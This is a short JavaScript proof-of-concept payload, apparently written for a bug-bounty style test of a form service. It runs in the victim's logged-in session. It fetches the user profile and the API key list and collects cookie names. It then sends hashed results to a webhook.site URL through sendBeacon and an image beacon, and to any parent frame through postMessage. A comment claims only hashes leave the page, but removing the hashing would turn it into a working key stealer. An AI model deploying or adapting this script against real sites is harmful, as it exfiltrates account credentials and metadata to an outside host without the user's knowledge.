/* AIAMR-1043-pm marker — baca-saja. NOL tulis, NOL pakai kunci, NOL nilai PII keluar:
   username hanya dikirim sebagai 8 hex pertama SHA-256 + panjangnya. */
(function () {
  var COLLECT = 'https://webhook.site/156aa60d-29c4-43fa-b37f-ed55d9007ce4/jotform/pm1043';
  var out = { origin: String(location.origin), at: Date.now(), href: String(location.href).slice(0, 300) };
  function j(o) { try { return JSON.stringify(o); } catch (e) { return ''; } }
  function hex4(b) { return Array.from(new Uint8Array(b)).slice(0, 4).map(function (x) { return x.toString(16).padStart(2, '0'); }).join(''); }
  async function sha(s) { try { return hex4(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(String(s)))); } catch (e) { return null; } }
  (async function () {
    try {
      var r = await fetch('/API/user', { credentials: 'include' });
      var t = await r.text();
      var c = {};
      try { c = (JSON.parse(t) || {}).content || {}; } catch (e) { c = {}; }
      var un = String(c.username == null ? '' : c.username);
      out.u = { s: r.status, len: t.length, ct: r.headers.get('content-type') || null,
        hasUserKey: t.indexOf('"username"') >= 0, hasEmailKey: t.indexOf('"email"') >= 0,
        isGuestToken: t.indexOf('"guest"') >= 0, unameLen: un.length, unameHash: await sha(un) };
    } catch (e) { out.u = { err: String(e).slice(0, 60) }; }
    try {
      var k = await fetch('/API/user/keys', { credentials: 'include' });
      var t2 = await k.text();
      var a = [];
      try { a = ((JSON.parse(t2) || {}).content) || []; } catch (e) { a = []; }
      out.k = { s: k.status, ct: k.headers.get('content-type') || null, bodyLen: t2.length, n: a.length, i: [] };
      for (var x of a) {
        var v = String(x.key || '');
        out.k.i.push({ a: String(x.access), l: v.length, f: await sha(v) });
      }
    } catch (e) { out.k = { err: String(e).slice(0, 60) }; }
    var ck = (document.cookie || '').split(';').map(function (x) { return x.trim().split('=')[0]; }).filter(Boolean);
    out.c = { n: ck.length, l: (document.cookie || '').length, names: ck };
    try { window.__AIAMR_1043_PM = out; } catch (e) { }
    try { document.documentElement.setAttribute('data-aiamr-1043-pm', '1'); } catch (e) { }
    try { document.title = 'AIAMR-1043-PM-EXEC ' + out.origin; } catch (e) { }
    try { parent.postMessage({ tag: 'PM1043-' + out.at, d: out }, '*'); } catch (e) { }
    try { navigator.sendBeacon(COLLECT + '/exec-' + out.at, j(out)); } catch (e) { }
    try { (new Image()).src = COLLECT + '/img-' + out.at + '?o=' + encodeURIComponent(out.origin); } catch (e) { }
  })();
})();
